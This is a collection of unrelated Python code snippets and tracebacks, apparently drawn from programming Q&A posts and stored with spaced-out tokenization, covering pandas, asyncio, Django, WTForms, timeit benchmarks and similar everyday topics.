'NoneType ' and 'int'Exception ignored in : < bound method BaseSession.__del__ of < tensorflow.python.client.session.Session object at 0x0000026396AD0630 > > Traceback ( most recent call last ) : File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\client\session.py '' , line 738 , in __del__TypeError : 'NoneType ' object is not callable"
"src=list ( 0,1,2,2,2,0,1,2 , ... ,2,1,2,1,1,0,2,1 ) # some code that uses the src"
"# spam.py ( library code ) def spam ( ham , eggs ) : `` ' Do something stupid with ham and eggs . At least one of ham and eggs must be True. `` ' _validate_spam_args ( ham , eggs ) return ham == eggsdef _validate_spam_args ( ham , eggs ) : if not ( ham or eggs ) : raise ValueError ( 'if we had ham ' 'we could have ham and eggs ' ' ( if we had eggs ) ' ) # client.py ( client code ) from spam import spamx = spam ( False , False ) % python client.pyTraceback ( most recent call last ) : File `` client.py '' , line 3 , in < module > x = spam ( False , False ) File `` /home/jones/spam.py '' , line 7 , in spam _validate_spam_args ( ham , eggs ) File `` /home/jones/spam.py '' , line 12 , in _validate_spam_args raise ValueError ( 'if we had ham 'ValueError : if we had ham we could have ham and eggs ( if we had eggs ) % python client.pyTraceback ( most recent call last ) : File `` client.py '' , line 3 , in < module > x = spam ( False , False ) ValueError : if we had ham we could have ham and eggs ( if we had eggs )"
there 's a 30 % chance my app does this : passelse : pass
"domain2range = pd.Series ( allrangevals , index=alldomainvals ) # Apply the mapquery_vals = pd.Series ( domainvals , index=someindex ) result = query_vals.map ( domain2range ) assert result.index is someindex # Niceassert ( result.values in allrangevals ) .all ( ) # Nice numiter = 100for n in [ 10 , 1000 , 1000000 , 10000000 , ] : domain = np.arange ( 0 , n ) range = domain+10 maptable = pd.Series ( range , index=domain ) .sort_index ( ) query_vals = pd.Series ( [ 1,2,3 ] ) def f ( ) : query_vals.map ( maptable ) print n , timeit.timeit ( stmt=f , number=numiter ) /numiter10 0.0006308102607731000 0.0009784698486331000000 0.0013064503669710000000 0.0162791204453"
Django==1.9.5python-social-auth==0.2.19+ dependencies SOCIAL_AUTH_GOOGLE_OAUTH2_AUTH_EXTRA_ARGUMENTS = { 'hd ' : 'example.com ' }
"teamlist = [ { `` name '' : '' Bears '' , `` wins '' :10 , `` losses '' :3 , `` rating '' :75.00 } , { `` name '' : '' Chargers '' , `` wins '' :4 , `` losses '' :8 , `` rating '' :46.55 } , { `` name '' : '' Dolphins '' , `` wins '' :3 , `` losses '' :9 , `` rating '' :41.75 } , { `` name '' : '' Patriots '' , `` wins '' :9 , `` losses '' :3 , `` rating '' : 71.48 } ]"
@ app.after_request def after_request_check_something ( response ) : # do something return response @ app.after_request def after_request_compress ( response ) : # do something return response
{ { poll.question } } { % if error_message % } < p > < strong > { { error_message } } < /strong > < /p > { % endif % } < form action= '' { % url 'polls : vote ' poll.id % } '' method= '' post '' > { % csrf_token % } { % for choice in poll.choice_set.all % } < input type= '' radio '' name= '' choice '' id= '' choice { { forloop.counter } } '' value= '' { { choice.id } } '' / > < label for= '' choice { { forloop.counter } } '' > { { choice.choice_text } } < /label > < br / > { % endfor % } < input type= '' submit '' value= '' Vote '' / > < /form >
"class DoubleIt : def __init__ ( self ) : self.start = 1 def __iter__ ( self ) : self.max = 10 return self def __next__ ( self ) : if self.start < self.max : self.start *= 2 return self.start else : raise StopIterationobj = DoubleIt ( ) i = iter ( obj ) print ( next ( i ) ) i = iter ( DoubleIt ( ) , 16 ) print ( next ( i ) ) i = iter ( DoubleIt , 16 ) print ( next ( i ) )"
"from allauth.socialaccount.models import SocialAppapper = SocialApp.objects.create ( provider=u'facebook ' , name=u'fb1 ' , client_id=u'7874132722290502 ' , secret=u'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX ' ) apper.sites.create ( domain='localhost:8000 ' , name='creyu.org ' )"
def filterRow ( row ) : row.reverse ( ) blanks = 0 for x in row : if x == `` : blanks += 1 else : break row.reverse ( ) return row [ 0 : -blanks ]
"def f1 ( ) : g = ( i for i in range ( 10 ) ) def f2 ( ) : g = [ ( yield i ) for i in range ( 10 ) ] def f3 ( ) : g = [ ( yield from range ( 10 ) ) ] > > > dis.dis ( f1 ) 4 0 LOAD_CONST 1 ( < code object < genexpr > at ... > ) 2 LOAD_CONST 2 ( 'f1. < locals > . < genexpr > ' ) 4 MAKE_FUNCTION 0 6 LOAD_GLOBAL 0 ( range ) 8 LOAD_CONST 3 ( 10 ) 10 CALL_FUNCTION 1 12 GET_ITER 14 CALL_FUNCTION 1 16 STORE_FAST 0 ( g ) 5 18 LOAD_FAST 0 ( g ) 20 RETURN_VALUE > > > dis.dis ( f2 ) 8 0 LOAD_CONST 1 ( < code object < listcomp > at ... > ) 2 LOAD_CONST 2 ( 'f2. < locals > . < listcomp > ' ) 4 MAKE_FUNCTION 0 6 LOAD_GLOBAL 0 ( range ) 8 LOAD_CONST 3 ( 10 ) 10 CALL_FUNCTION 1 12 GET_ITER 14 CALL_FUNCTION 1 16 STORE_FAST 0 ( g ) 9 18 LOAD_FAST 0 ( g ) 20 RETURN_VALUE > > > dis.dis ( f3 ) 12 0 LOAD_GLOBAL 0 ( range ) 2 LOAD_CONST 1 ( 10 ) 4 CALL_FUNCTION 1 6 GET_YIELD_FROM_ITER 8 LOAD_CONST 0 ( None ) 10 YIELD_FROM 12 BUILD_LIST 1 14 STORE_FAST 0 ( g ) 13 16 LOAD_FAST 0 ( g ) 18 RETURN_VALUE > > > timeit ( f1 ) 0.5334039637357152 > > > timeit ( f2 ) 0.5358906506760719 > > > timeit ( f3 ) 0.19329123352712596 def f ( ) : passdef fn ( ) : g = ... for _ in g : f ( ) > > > timeit ( f1 ) 1.6017412817975778 > > > timeit ( f2 ) 1.778684261368946 > > > timeit ( f3 ) 0.1960603619517669 def f1 ( ) : for i in range ( 10 ) : print ( i ) def f2 ( ) : for i in [ ( yield from range ( 10 ) ) ] : print ( i ) > > > timeit ( f1 , number=100000 ) 26.715589237537195 > > > timeit ( f2 , number=100000 ) 0.019948781941049987"
"import asyncioimport inspectimport typesfrom asyncio import BaseEventLoopfrom concurrent import futuresdef await_sync ( coro : types.CoroutineType , timeout_s : int=None ) : `` '' '' : param coro : a coroutine or lambda loop : coroutine ( loop ) : param timeout_s : : return : `` '' '' loop = asyncio.new_event_loop ( ) # type : BaseEventLoop if not is_awaitable ( coro ) : coro = coro ( loop ) if timeout_s is None : fut = asyncio.ensure_future ( coro , loop=loop ) else : fut = asyncio.ensure_future ( asyncio.wait_for ( coro , timeout=timeout_s , loop=loop ) , loop=loop ) loop.run_until_complete ( fut ) return fut.result ( ) def is_awaitable ( coro_or_future ) : if isinstance ( coro_or_future , futures.Future ) : return coro_or_future elif asyncio.coroutines.iscoroutine ( coro_or_future ) : return True elif asyncio.compat.PY35 and inspect.isawaitable ( coro_or_future ) : return True else : return False File : `` /src\system\utils.py '' , line 34 , in await_sync loop = asyncio.new_event_loop ( ) # type : BaseEventLoopFile : `` \lib\asyncio\events.py '' , line 636 , in new_event_loop return get_event_loop_policy ( ) .new_event_loop ( ) File : `` \lib\asyncio\events.py '' , line 587 , in new_event_loop return self._loop_factory ( ) File : `` \lib\asyncio\selector_events.py '' , line 55 , in __init__ self._make_self_pipe ( ) File : `` \lib\asyncio\selector_events.py '' , line 116 , in _make_self_pipe self._ssock , self._csock = self._socketpair ( ) File : `` \lib\asyncio\windows_events.py '' , line 295 , in _socketpair return windows_utils.socketpair ( ) File : `` \lib\socket.py '' , line 515 , in socketpair ssock , _ = lsock.accept ( ) File : `` \lib\socket.py '' , line 195 , in accept fd , addr = self._accept ( )"
"input = [ ' 1 ' , '10 ' , ' 2 ' , ' 0 ' , ' 3 ' , 'Hello ' , '100 ' , 'Allowance ' ] sorted_input = sorted ( input ) print ( sorted_input ) [ ' 0 ' , ' 1 ' , ' 2 ' , ' 3 ' , '10 ' , '100 ' , 'Allowance ' , 'Hello ' ] [ ' 0 ' , ' 1 ' , '10 ' , '100 ' , ' 2 ' , ' 3 ' , 'Allowance ' , 'Hello ' ]"
"[ ' a ' , 'one `` two '' three ' , 'foo , bar ' , `` '' '' both '' ' '' '' '' ] a , 'one `` two '' three ' , `` foo , bar '' , `` both\ '' ' ''"
"import numpy as npfrom scipy.stats import circmean , circvara = np.random.randint ( 0 , high=360 , size=10 ) print ( a ) print ( circmean ( a , 0 , 360 ) ) print ( circvar ( np.deg2rad ( a ) ) ) [ 143 116 152 172 349 152 182 306 345 81 ] 135.349745419546652.2576538466653857"
i = range ( 5 ) a = [ f ( i ) for i in i ]
"from module.ClassToTest import ClassToTestclass Test ( object ) : @ mock.patch ( 'module.ClassToPatch.ClassToPatch ' , autospec = False ) def setUp ( self , my_class_mock ) : self.instance = my_class_mock.return_value self.instance.my_method.return_value = `` def '' self.class_to_test = ClassToTest ( ) def test ( self ) : val = self.class_to_test.instance.my_method ( ) # Returns 'abc ' instead of 'def ' self.assertEqual ( val , 'def ' ) class ClassToPatch ( object ) : def __init__ ( self ) : pass def my_method ( self ) : return `` abc '' from module.ClassToPatch import ClassToPatchclass ClassToTest ( object ) : def __init__ : # Still instantiates the concrete class instead of the mock self.instance = ClassToPatch ( )"
"-- -title : `` R Notebook '' output : html_document : df_print : paged -- - `` ` { r setup , include=FALSE } knitr : :opts_chunk $ set ( echo = TRUE ) library ( reticulate ) `` `` `` { python } x = 1 `` `` `` { python } print ( x ) `` `` `` { r } print ( py $ x ) `` ` Traceback ( most recent call last ) : File `` C : \Users\rougipa\AppData\Local\Temp\2\RtmpQFW3Rj\chunk-code-1d44920f50.txt '' , line 1 , in < module > print ( x ) NameError : name ' x ' is not defined"
"0022d9064bc,1073260801,1073260803,819251,44000600022d9064bc,1073260803,1073260810,819213,43995400904b4557d3,1073260803,1073261920,817526,43945800022de73863,1073260804,1073265410,817558,43952500904b14b494,1073260804,1073262625,817558,43952500904b14b494,1073260804,1073265163,817558,43952500904b14b494,1073260804,1073263786,817558,43952500022d1406df,1073260807,1073260809,820428,43873500022d1406df,1073260807,1073260878,820428,43873500022d623dfe,1073260810,1073276346,819251,44000600022d7317d7,1073260810,1073276155,819251,44000600022d9064bc,1073260810,1073272525,819251,44000600022d9064bc,1073260810,1073260999,819251,44000600022d9064bc,1073260810,1073260857,819251,4400060030650c9eda,1073260811,1073260813,820356,43922400022d0e0cec,1073260813,1073262843,820187,43927100022d176cf3,1073260813,1073260962,817721,439564000c30d8d2e8,1073260813,1073260902,817721,43956400904b243bc4,1073260813,1073260962,817721,43956400904b2fc34d,1073260813,1073260962,817721,43956400904b52b839,1073260813,1073260962,817721,43956400904b9a5a51,1073260813,1073260962,817721,43956400904ba8b682,1073260813,1073260962,817721,43956400022d3be9cd,1073260815,1073261114,819269,43940300022d80381f,1073260815,1073261114,819269,43940300022dc1b09c,1073260815,1073261114,819269,43940300022d36a6df,1073260817,1073260836,820761,43860700022d36a6df,1073260817,1073260845,820761,438607003065d2d8b6,1073260817,1073267560,817735,43975700904b0c7856,1073260817,1073265149,817735,43975700022de73863,1073260825,1073260879,817558,43952500904b14b494,1073260825,1073260879,817558,43952500904b312d9e,1073260825,1073260879,817558,43952500022d15b1c7,1073260826,1073260966,820353,43928000022dcbe817,1073260826,1073260966,820353,439280"
name valueA 2A 4A 5A 7A 8B 3B 4B 8C 1C 3C 5 name value difA 2 0A 4 2A 5 1A 7 2A 8 1B 3 0B 4 1B 8 4C 1 0C 3 2C 5 2
"% matplotlib inlineimport numpy as npimport matplotlib.pyplot as pltfrom IPython.html.widgets import interactfrom IPython.display import displaydef sigmoid_demo ( a=5 , b=1 ) : x = np.linspace ( 0,10,256 ) s = 1/ ( 1+np.exp ( - ( x-a ) / ( b+0.1 ) ) ) # +0.1 to avoid dividing by 0 sn = 100.0* ( s-min ( s ) ) / ( max ( s ) -min ( s ) ) # normalize sigmoid to 0-100 # Does this have to be in this function ? fig , ax = plt.subplots ( figsize= ( 24,6 ) ) ax.set_xticks ( [ ] ) ax.set_yticks ( [ ] ) plt.plot ( x , sn , lw=2 , color='black ' ) plt.xlim ( x.min ( ) , x.max ( ) ) w=interact ( sigmoid_demo , a=5 , b=1 )"
"processes = 4enable-threads = truethreads = 20vacuum = truedie-on-term = trueharakiri = 10max-requests = 5000thread-stacksize = 2048thunder-lock = truemax-fd = 150000 # currently disabled for testing # cheaper-algo = spare2 # cheaper = 2 # cheaper-initial = 2 # workers = 4 # cheaper-step = 1 rdb = [ redis.StrictRedis ( host='server-endpoint ' , port=6379 , db=0 ) , redis.StrictRedis ( host='server-endpoint ' , port=6379 , db=1 ) ] def cache_set ( key , subkey , val , db , cache_timeout=DEFAULT_TIMEOUT ) : t = time.time ( ) merged_key = key + ' : ' + subkey res = rdb [ db ] .set ( merged_key , val , cache_timeout ) print 'cache_set time ' + str ( time.time ( ) - t ) return rescache_set ( 'prefix ' , 'key_name ' , 'my glorious value ' , 0 , 20 ) def cache_get ( key , subkey , db , _eval=False ) : t = time.time ( ) merged_key = key + ' : ' + subkey val = rdb [ db ] .get ( merged_key ) if _eval : if val : val = eval ( val ) else : # None val = 0 print 'cache_get time ' + str ( time.time ( ) - t ) return valcache_get ( 'prefix ' , 'key_name ' , 0 )"
\U0001f600-\U0001f650 \U0001f918
"import asyncioimport randomasync def sleepy ( value ) : return await asyncio.sleep ( value , result=value ) async def main ( input_values ) : result = [ ] for sleeper in asyncio.as_completed ( map ( sleepy , input_values ) ) : result.append ( await sleeper ) print ( result ) if __name__ == '__main__ ' : loop = asyncio.get_event_loop ( ) input_values = list ( range ( -5 , 6 ) ) random.shuffle ( input_values ) loop.run_until_complete ( main ( input_values ) )"
"import sysfrom PySide2.QtWidgets import QApplication , QLabelapp = QApplication ( sys.argv ) label = QLabel ( `` Hello World '' ) label.show ( ) app.exec_ ( ) File `` ../script.py '' , line 17 , in < module > app = QApplication ( sys.argv ) RuntimeError : Please destroy the QApplication singleton before creating a new QApplication instance ."
"teams = [ team 1 , team 2 , team 3 , team 4 ] print list ( itertools.combinations ( teams , 2 ) ) [ ( team 1 , team 2 ) , ( team 1 , team 3 ) , ( team 1 , team 4 ) , ( team 2 , team 3 ) , ( team 2 , team 4 ) , ( team 3 , team 4 ) ] [ [ ( team 1 , team 2 ) , ( team 3 , team 4 ) ] , # day 1 [ ( team 1 , team 3 ) , ( team 2 , team 4 ) ] , # day 2 [ ( team 1 , team 4 ) , ( team 2 , team 3 ) ] # day 3 ]"
"> > > l = len ( `` X this is a test '' ) > > > matcher = difflib.SequenceMatcher ( None , `` X this is a test '' , `` this is a test X '' ) > > > matcher.find_longest_match ( 0 , l , 0 , l ) Match ( a=2 , b=0 , size=14 ) > > > s1 = `` e-like graph visualization using a spanning tree-driven layout technique with constraints specified by layers and the ordering of groups of nodes within layers . We propose a new method of how the orde '' > > > s2 = `` itree graph visualization using a spanning tree-driven layout technique with constraints speci ed by layers and the ordering of groups of nodes within layers . We propose a new method of how the drivin '' > > > matcher = difflib.SequenceMatcher ( None , s1 , s2 ) > > > matcher.find_longest_match ( 1 , 149 , 5 , 149 ) Match ( a=1 , b=47 , size=1 )"
"words = [ `` oranges '' , `` apples '' , `` apples '' , `` bananas '' , `` kiwis '' , `` kiwis '' , `` apples '' ] dict_counter = { } for w in words : dict_counter [ w ] = dict_counter.get ( w , 0 ) +1print ( dict_counter ) # { 'oranges ' : 1 , 'apples ' : 3 , 'bananas ' : 1 , 'kiwis ' : 2 } from collections import Counter , defaultdictprint ( Counter ( words ) ) # Counter ( { 'apples ' : 3 , 'kiwis ' : 2 , 'oranges ' : 1 , 'bananas ' : 1 } ) dict_dd = defaultdict ( int ) for w in words : dict_dd [ w ] += 1print ( dict_dd ) # defaultdict ( < class 'int ' > , { 'oranges ' : 1 , 'apples ' : 3 , 'bananas ' : 1 , 'kiwis ' : 2 } )"
"some_dict = { 001 : `` spam '' , 002 : `` eggs '' , 003 : `` foo '' , 004 : `` bar '' , 008 : `` anything '' , # Throws a SyntaxError 009 : `` nothing '' # Throws a SyntaxError }"
In [ 133 ] : agg_counts = by_tz_os.size ( ) .unstack ( ) .fillna ( 0 ) Out [ 133 ] : a Not Windows Windows tz 245 276 Africa/Cairo 0 3 Africa/Casablanca 0 1 Africa/Ceuta 0 2 Africa/Johannesburg 0 1 Africa/Lusaka 0 1 America/Anchorage 4 1 ... In [ 134 ] : indexer = agg_counts.sum ( 1 ) .argsort ( ) Out [ 134 ] : tz 24Africa/Cairo 20Africa/Casablanca 21Africa/Ceuta 92Africa/Johannesburg 87Africa/Lusaka 53America/Anchorage 54America/Argentina/Buenos_Aires 57America/Argentina/Cordoba 26America/Argentina/Mendoza 55America/Bogota 62 ...
from Foo.Bar import Baz ... # now Baz ( ) can be called directly without using Foo.Bar.Baz ( ) everytime
"> > > from enum import Enum > > > class Color ( Enum ) : black = [ 1,2 ] blue = [ 1,2,3 ] > > > val_1 = [ 1,2 ] > > > val_2 = [ 1,2,3 ] > > > Color ( val_1 ) < Color.black : [ 1 , 2 ] > > > > Color ( val_2 ) < Color.blue : [ 1 , 2 , 3 ] > > > > my_color = Color ( val_1 ) > > > my_color.value.append ( 3 ) > > > Color ( val_2 ) < Color.black : [ 1 , 2 , 3 ] > > > > Color ( val_1 ) Traceback ( most recent call last ) : ... ValueError : [ 1 , 2 ] is not a valid Color"
"import timeitdef test1 ( ) : a = [ 1,2,3 ] a.insert ( 0,1 ) def test2 ( ) : a = [ 1,2,3 ] a [ 0:0 ] = [ 1 ] print ( timeit.timeit ( 'test1 ( ) ' , 'from __main__ import test1 ' ) ) print ( timeit.timeit ( 'test2 ( ) ' , 'from __main__ import test2 ' ) )"
boolean flag = Truefor ( int i = 1 ; i < 20 & & flag ; i *= 2 ) { //Code in here }
"for city in montaomodel.City.all ( ) .fetch ( 99999 ) : # TODO : only do this for the region try : form.area.choices.insert ( long ( city.key ( ) .id ( ) ) , ( str ( city.key ( ) .id ( ) ) , 'Select ... ' ) ) except : pass class AdLister ( BaseRequestHandler , blobstore_handlers.BlobstoreUploadHandler ) : csrf_protect = False def post ( self ) : logging.info ( `` i post '' ) ad = Ad ( ) if users.get_current_user ( ) : ad.user = users.get_current_user ( ) if self.current_user is not None : try : ad.usr = self.current_user except Exception , e : logging.info ( 'exception % s ' % str ( e ) ) logging.info ( `` i post2 '' ) if self.request.get ( 'type ' ) : ad.type = self.request.get ( 'type ' ) if self.request.get ( 'address ' ) : ad.address = self.request.get ( 'address ' ) if self.request.get ( 'rooms ' ) : ad.number_of_rooms = int ( self.request.get ( 'rooms ' ) ) if self.request.get ( 'size ' ) : ad.size = float ( self.request.get ( 'size ' ) ) if self.request.get ( 'regdate ' ) : ad.regdate = int ( self.request.get ( 'regdate ' ) ) if self.request.get ( 'mileage ' ) : ad.mileage = int ( self.request.get ( 'mileage ' ) ) ad.category = self.request.get ( 'category_group ' ) form = AdForm ( self.request.params ) logging.info ( `` i post23 '' ) if self.request.get ( 'area ' ) : for city in montaomodel.City.all ( ) .fetch ( 99999 ) : # TODO : only do this for the region # logging.info ( `` i post232 '' ) # logging.info ( `` region % s '' , city.region.key ( ) .id ( ) ) try : form.area.choices.insert ( str ( long ( city.key ( ) .id ( ) ) ) , ( str ( city.key ( ) .id ( ) ) , 'Select ... ' ) ) except : pass logging.info ( `` i post3 '' ) if form.validate ( ) : title = to_unicode_or_bust ( form.title.data ) # unicode ( form.title.data , 'utf-8 ' ) ad.title = title self.session [ 'title ' ] = ad.title name = to_unicode_or_bust ( form.name.data ) # , 'utf-8 ' ) ad.name = name self.session [ 'name ' ] = ad.name ad.email = form.email.data self.session [ 'email ' ] = ad.email ad.phoneview = form.phoneview.data self.session [ 'phoneview ' ] = ad.phoneview try : if form.phonenumber.data : ad.phonenumber = form.phonenumber.data self.session [ 'phonenumber ' ] = ad.phonenumber except : pass text = to_unicode_or_bust ( form.text.data ) # , 'utf8 ' ) titletest = to_unicode_or_bust ( form.title.data ) ad.text = text self.session [ 'text ' ] = ad.text ad.price = form.price.data.replace ( ' ' , `` ) .replace ( ',00 ' , `` ) .replace ( '.00 ' , `` ) try : if form.price.data : ad.integer_price = form.price.data.replace ( ' ' , `` ) .replace ( ',00 ' , `` ) .replace ( '.00 ' , `` ) except : pass self.session [ 'price ' ] = ad.price ad.url = self.request.host self.session [ 'url ' ] = self.request.host ad.place = self.request.get ( 'place ' ) self.session [ 'place ' ] = ad.place ad.postaladress = self.request.get ( 'place ' ) self.session [ 'postaladress ' ] = ad.postaladress ad.put ( ) self.session [ 'ad_id ' ] = ad.key ( ) .id ( ) else : self.render ( 'createnewad.html ' , { 'user ' : self.current_user , 'session ' : self.auth.get_user_by_session ( ) , 'request ' : self.request , 'form ' : form , 'name ' : to_unicode_or_bust ( form.name.data ) # .encode ( 'utf-8 ' ) } ) return if self.request.get ( 'currency ' ) : ad.currency = self.request.get ( 'currency ' ) self.session [ 'currency ' ] = ad.currency if self.request.get ( 'cg ' ) : ad.category = self.request.get ( 'cg ' ) self.session [ 'category ' ] = ad.category if self.request.get ( 'company_ad ' ) == ' 1 ' : ad.company_ad = True self.session [ 'company_ad ' ] = 'True ' ad.put ( ) ad.url = self.request.host for upload in self.get_uploads ( ) : try : img = Image ( reference=ad ) img.primary_image = upload.key ( ) image_url = images.get_serving_url ( str ( upload.key ( ) ) , size=640 ) img.put ( ) ad.hasimages = True ad.image_url = images.get_serving_url ( str ( upload.key ( ) ) , size=640 ) ad.put ( ) ad.blobs.append ( upload.key ( ) ) ad.put ( ) except Exception , e : logging.error ( 'There was an exception : % s ' % str ( e ) ) pass ad.published = False if self.request.get ( 'area ' ) : city = \ montaomodel.City.get_by_id ( long ( self.request.get ( 'area ' ) ) ) region = montaomodel.Region.get ( city.region.key ( ) ) ad.cities.append ( city.key ( ) ) ad.regions.append ( region.key ( ) ) ad.city = unicode ( city.name ) ad.region = unicode ( region.name ) ad.put ( ) if self.current_user : ad.userID = str ( self.current_user.auth_ids [ 0 ] ) ad.put ( ) ad.usr = self.current_user.key.to_old_key ( ) ad.put ( ) image = ad.matched_images.get ( ) image_url = None if image : if image.primary_image : try : image_url = \ images.get_serving_url ( str ( image.primary_image.key ( ) ) , size=640 ) except Exception , e : image_url = '/images/ ' + str ( image.key ( ) .id ( ) ) \ + '_small.jpg ' else : image_url = '/images/ ' + str ( image.key ( ) .id ( ) ) \ + '_small.jpg ' imv = [ ] for i in ad.matched_images : if i.primary_image : try : i1 = \ images.get_serving_url ( str ( i.primary_image.key ( ) ) ) imv.append ( i1 ) except Exception , e : i1 = '/images/ ' + str ( image.key ( ) .id ( ) ) \ + '_small.jpg ' imv.append ( i1 ) if ad.price : # and does n't contain separators try : price = \ i18n.I18n ( self.request ) .format_decimal ( int ( ad.price ) ) except Exception , e : price = ad.price else : price = ad.price self.render ( 'preview.html ' , { 'user ' : self.current_user , 'session ' : self.auth.get_user_by_session ( ) , 'request ' : self.request , 'ad ' : ad , 'image_url ' : image_url , 'imv ' : imv , 'len ' : len ( imv ) , 'form ' : PreviewAdForm ( ) , 'price ' : price , } ) class AdForm ( Form ) : categories = [ ( ' 1 ' , _ ( 'All categories ' ) ) , ( 'disabled ' , _ ( 'VEHICLES ' ) ) , ( '2010 ' , _ ( 'Cars ' ) ) , ( ' 3 ' , _ ( 'Motorcycles ' ) ) , ( ' 4 ' , _ ( 'Accessories & Parts ' ) ) , ( 'disabled ' , _ ( 'PROPERTIES ' ) ) , ( ' 7 ' , _ ( 'Apartments ' ) ) , ( ' 8 ' , _ ( 'Houses ' ) ) , ( ' 9 ' , _ ( 'Commercial properties ' ) ) , ( '10 ' , _ ( 'Land ' ) ) , ( 'disabled ' , _ ( 'ELECTRONICS ' ) ) , ( '12 ' , _ ( 'Mobile phones & Gadgets ' ) ) , ( '13 ' , _ ( 'TV/Audio/Video/Cameras ' ) ) , ( '14 ' , _ ( 'Computers ' ) ) , ( 'disabled ' , _ ( 'HOME & PERSONAL ITEMS ' ) ) , ( '16 ' , _ ( 'Home & Garden ' ) ) , ( '17 ' , _ ( 'Clothes/Watches/Accessories ' ) ) , ( '18 ' , _ ( 'For Children ' ) ) , ( 'disabled ' , _ ( 'LEISURE/SPORTS/HOBBIES ' ) ) , ( '20 ' , _ ( 'Sports & Outdoors ' ) ) , ( '21 ' , _ ( 'Hobby & Collectables ' ) ) , ( '22 ' , _ ( 'Music/Movies/Books ' ) ) , ( '23 ' , _ ( 'Pets ' ) ) , ( '20 ' , _ ( 'BUSINESS TO BUSINESS ' ) ) , ( '24 ' , _ ( 'Hobby & Collectables ' ) ) , ( '25 ' , _ ( 'Professional/Office equipment ' ) ) , ( '26 ' , _ ( 'Business for sale ' ) ) , ( 'disabled ' , _ ( 'JOBS & SERVICES ' ) ) , ( '28 ' , _ ( 'Jobs ' ) ) , ( '29 ' , _ ( 'Services ' ) ) , ( '30 ' , _ ( 'Events & Catering ' ) ) , ( '31 ' , _ ( 'Others ' ) ) , ( '1000 ' , _ ( 'Sports & Outdoors ' ) ) , ( '1010 ' , _ ( 'Hobby & Collectables ' ) ) , ( '1020 ' , _ ( 'Hobby & Collectables ' ) ) , ( '1030 ' , _ ( 'Music/Movies/Books ' ) ) , ( '1050 ' , _ ( 'Pets ' ) ) , ( '1080 ' , _ ( 'BUSINESS TO BUSINESS ' ) ) , ( '1100 ' , _ ( 'Hobby & Collectables ' ) ) , ( '1090 ' , _ ( 'Professional/Office equipment ' ) ) , ( '2010 ' , _ ( 'Business for sale ' ) ) , ( '2030 ' , _ ( 'Sports & Outdoors ' ) ) , ( '2040 ' , _ ( 'Hobby & Collectables ' ) ) , ( '2080 ' , _ ( 'Music/Movies/Books ' ) ) , ( '2070 ' , _ ( 'Pets ' ) ) , ( '3000 ' , _ ( 'BUSINESS TO BUSINESS ' ) ) , ( '3040 ' , _ ( 'Hobby & Collectables ' ) ) , ( '3050 ' , _ ( 'Professional/Office equipment ' ) ) , ( '3060 ' , _ ( 'Business for sale ' ) ) , ( '4000 ' , _ ( 'Sports & Outdoors ' ) ) , ( '4010 ' , _ ( 'Hobby & Collectables ' ) ) , ( '4020 ' , _ ( 'Music/Movies/Books ' ) ) , ( '4040 ' , _ ( 'Pets ' ) ) , ( '4030 ' , _ ( 'BUSINESS TO BUSINESS ' ) ) , ( '4090 ' , _ ( 'Hobby & Collectables ' ) ) , ( '4060 ' , _ ( 'Professional/Office equipment ' ) ) , ( '4070 ' , _ ( 'Business for sale ' ) ) , ( '5030 ' , _ ( 'Music/Movies/Books ' ) ) , ( '5020 ' , _ ( 'Pets ' ) ) , ( '5010 ' , _ ( 'BUSINESS TO BUSINESS ' ) ) , ( '5040 ' , _ ( 'Hobby & Collectables ' ) ) , ( '6010 ' , _ ( 'Professional/Office equipment ' ) ) , ( '6020 ' , _ ( 'Business for sale ' ) ) , ( '6030 ' , _ ( 'Music/Movies/Books ' ) ) , ( '6040 ' , _ ( 'Pets ' ) ) , ( '7010 ' , _ ( 'BUSINESS TO BUSINESS ' ) ) , ( 'Other ' , _ ( 'Hobby & Collectables ' ) ) , ] regions = [ ( `` , _ ( 'Choose ' ) ) , ( ' 3 ' , _ ( 'Delhi ' ) ) , ( ' 4 ' , _ ( 'Maharasta ' ) ) , ( ' 7 ' , _ ( 'Gujarat ' ) ) ] cities = [ ( `` , _ ( ' « Choose city » ' ) ) , ( ' 3 ' , _ ( 'Mumbai ' ) ) , ( ' 4 ' , _ ( 'Delhi ' ) ) ] nouser = HiddenField ( _ ( 'No user ' ) ) # dummy variable to know whether user is logged in name = TextField ( _ ( 'Name ' ) , [ validators.Required ( message=_ ( 'Name is required ' ) ) ] , widget=MontaoTextInput ( ) ) title = TextField ( _ ( 'Subject ' ) , [ validators.Required ( message=_ ( 'Subject is required ' ) ) ] , widget=MontaoTextInput ( ) ) text = TextAreaField ( _ ( 'Ad text ' ) , [ validators.Required ( message=_ ( 'Text is required ' ) ) ] , widget=MontaoTextArea ( ) ) phonenumber = TextField ( _ ( 'Phone ' ) , [ validators.Optional ( ) ] ) type = TextField ( _ ( 'Type ' ) , [ validators.Required ( message=_ ( 'Type is required ' ) ) ] ) phoneview = BooleanField ( _ ( 'Display phone number on site ' ) ) price = TextField ( _ ( 'Price ' ) , [ validators.Regexp ( '^ [ 0-9 ] + $ ' , message=_ ( 'This is not an integer number , please see the example and try again ' ) ) , validators.Optional ( ) ] , widget=MontaoTextInput ( ) ) email = TextField ( _ ( 'Email ' ) , [ validators.Required ( message=_ ( 'Email is required ' ) ) , validators.Email ( message=_ ( 'Your email is invalid ' ) ) ] , widget=MontaoTextInput ( ) ) area = SelectField ( _ ( 'City ' ) , choices=cities , validators= [ validators.Optional ( ) ] ) category_group = SelectField ( _ ( 'Category ' ) , choices=categories , validators= [ validators.Required ( message=_ ( 'Category is required ' ) ) ] ) def validate_name ( form , field ) : if len ( field.data ) > 50 : raise ValidationError ( _ ( 'Name must be less than 50 characters ' ) ) def validate_email ( form , field ) : if len ( field.data ) > 60 : raise ValidationError ( _ ( 'Email must be less than 60 characters ' ) ) def validate_price ( form , field ) : if len ( field.data ) > 8 : raise ValidationError ( _ ( 'Price must be less than 9 integers ' ) ) def validate_area ( form , field ) : if len ( field.data ) > 888 : raise ValidationError ( _ ( 'Dummy validator ' ) )"
"class Questionnaire ( models.Model ) : YES_NO_CHOICES = ( ( True , 'Yes ' ) , ( False , 'No ' ) , ) satisfaction = models.BooleanField ( choices=YES_NO_CHOICES , default=True ) register = models.DateField ( auto_now_add=True ) { '2015-11-29 ' : { True : 1 , False : 2 } , '2015-11-30 ' : { True : 3 , False : 1 } , '2015-12-01 ' : { True : 5 , False : 2 } , '2015-12-05 ' : { True : 3 , False : 6 } } { { '2015-11-01 ' : { True : 4 , False : 3 } , { '2015-12-01 ' : { True : 8 , False : 8 } }"
